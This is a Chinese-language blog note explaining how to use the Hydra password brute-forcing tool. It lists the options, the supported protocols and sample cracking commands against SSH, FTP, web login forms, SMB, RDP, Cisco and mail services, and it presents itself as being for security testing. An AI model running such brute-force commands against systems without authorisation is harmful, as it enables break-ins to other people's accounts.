---
title: Hydra用法简记
tags:
  - - Hydra
  - - 渗透测试
categories:
  - [项目组, Hydra]
abbrlink: 78d34d76
date: 2020-09-14 17:51:23
---

> hydra是著名黑客组织thc的一款开源的暴力密码破解[工具](https://github.com/vanhauser-thc/thc-hydra),可以在线破解多种密码。
>
> 官网:http://www.thc.org/thc-hydra
>
> 这款暴力密码破解工具相当强大,支持几乎所有协议的在线密码破解,其密码能否被破解关键在于字典是否足够强大。本文仅从安全角度去探讨测试,使用本文内容去做破坏者,与本人无关。

### 1.指令范式

```bash
hydra [some command line options] [-s PORT] TARGET PROTOCOL [MODULE-OPTIONS]
```

### 2.参数选项

使用option指定参数

> -R 根据上一次进度继续破解
>
> -S 使用SSL协议连接
>
> -s 指定端口,也可通过ip:port指定端口
>
> -l 指定用户名
>
> -L 指定用户名字典(文件)
>
> -p 指定密码破解
>
> -P 指定密码字典(文件)
>
> -e ns 空密码探测和指定用户密码探测,n代表null尝试,代表密码同账户名尝试
>
> -C 用户名可以用:分割(username:password)可以代替-l username -p password,同时支持该类型下的文件
>
> -M 指定地址(文件)
>
> -4/6 指定ipv4或ipv6(默认ipv4)
>
> -o 输出文件
>
> -t 指定多线程数量,默认为16个线程
>
> -vV 显示详细过程
>
> -f 当账号密码爆破成功时,不再继续进行(通常适用于单用户破解)
>
> -x min:max:charset 生成密码字典,min最短长度,max最长长度,charset中a代表小写字母,A代表大写字母,1代表数字

### 3.指定IP

- 使用一个独立的IP或者DNS地址
- 使用CIDR类型的地址段,例`"192.168.0.0/24"`
- 通过文件指定地址(使用参数选项 - M)
- 亦可通过新方式指定协议、地址、端口、可选项,例`ftp://192.168.33.44:22`

### 4.指定协议

在target之后指明协议。

> 目前支持的协议类型有:Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP

### 5.示例

```bash
# 破解ssh:
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh
hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh
```

```bash
# 破解ftp:
hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV
hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV
```

```bash
# get方式提交,破解web登录:
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php
```

```bash
# post方式提交,破解web登录:
hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form ``"/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password"
```

```bash
hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form "login.php:id=^USER^&passwd=^PASS^:<title>wrong username or password</title>"
# 参数说明:-t同时线程数3,-l用户名是admin,字典pass.txt,保存为out.txt,-f 当破解了一个密码就停止,
# 10.36.16.18目标ip,http-post-form表示破解是采用http的post方式提交的表单密码破解,<title>中的内容是表示错误猜解的返回信息提示。
```

```bash
# 破解https:
hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https
```

```bash
# 破解teamspeak:
hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak
```

```bash
# 破解cisco:
hydra -P pass.txt 10.36.16.18 cisco
hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable
```

```bash
# 破解smb:
hydra -l administrator -P pass.txt 10.36.16.18 smb 
```

```bash
# 破解pop3:
hydra -l muts -P pass.txt my.pop3.mail pop3
```

```bash
# 破解rdp:
hydra ip rdp -l administrator -P pass.txt -V
```

```bash
# 破解http-proxy:
hydra -l admin -P pass.txt http-proxy://10.36.16.18
```

```bash
# 破解imap:
hydra -L user.txt -p secret 10.36.16.18 imap PLAIN
hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN
```

---

> 参考:
>
> https://github.com/vanhauser-thc/thc-hydra#special-options-for-modules
>
> http://xstarcd.github.io/wiki/shell/hydra.html
>
> https://yq.aliyun.com/articles/333121